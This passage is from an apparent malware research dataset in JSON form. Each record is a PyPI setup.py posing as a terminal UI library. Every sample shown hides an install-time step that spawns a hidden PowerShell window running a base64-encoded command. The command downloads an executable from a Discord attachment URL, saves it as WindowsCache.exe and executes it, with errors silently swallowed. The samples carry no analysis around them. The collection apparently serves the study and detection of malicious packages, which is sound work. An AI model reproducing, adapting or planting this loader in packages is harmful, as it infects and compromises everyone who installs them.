        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpgamelibhacked',\n    packages = ['modlib'],\n    version = '2.67',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpgrandvmpaypal-v4.10",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpgrandvmpaypal',\n    packages = ['modlib'],\n    version = '7.10',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tphackedcraftnvidia-v7.43",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tphackedcraftnvidia',\n    packages = ['modlib'],\n    version = '9.84',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tphackedintelhydra-v10.72",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tphackedintelhydra',\n    packages = ['modlib'],\n    version = '3.53',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tphttpsuperpep-v5.46",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tphttpsuperpep',\n    packages = ['modlib'],\n    version = '7.20',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tphydracvmask-v6.11",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tphydracvmask',\n    packages = ['modlib'],\n    version = '4.98',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tplibhydrainfo-v2.54",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tplibhydrainfo',\n    packages = ['modlib'],\n    version = '2.68',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tplibpullpyw-v5.71",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tplibpullpyw',\n    packages = ['modlib'],\n    version = '7.18',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpmasklibsplit-v10.59",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpmasklibsplit',\n    packages = ['modlib'],\n    version = '3.97',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpmcverhacked-v4.35",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpmcverhacked',\n    packages = ['modlib'],\n    version = '8.57',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpnvidiaintelpush-v10.44",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpnvidiaintelpush',\n    packages = ['modlib'],\n    version = '6.28',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpnvidiareurl-v7.23",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpnvidiareurl',\n    packages = ['modlib'],\n    version = '9.76',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpproofgameed-v5.95",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpproofgameed',\n    packages = ['modlib'],\n    version = '2.76',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tppywrandompull-v9.29",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppywrandompull',\n    packages = ['modlib'],\n    version = '8.90',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  